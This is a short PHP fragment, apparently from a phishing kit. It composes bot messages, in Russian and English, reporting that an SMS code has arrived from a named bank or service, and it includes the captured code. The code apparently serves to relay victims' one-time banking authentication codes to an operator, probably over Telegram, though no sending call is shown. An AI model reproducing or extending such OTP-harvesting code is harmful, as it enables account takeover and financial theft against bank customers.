...
$messageToBot .= '📩Пришёл код из СМС <b>' . $bank_name . '</b>' . PHP_EOL;
$messageToBot .= '♣️Code: <code>' . $sms . '</code>' . PHP_EOL;
...
$messageToBot = '<b>' . $currService . '</b>'. PHP_EOL;
$messageToBot .= '📩Пришёл код из SMS' . PHP_EOL;
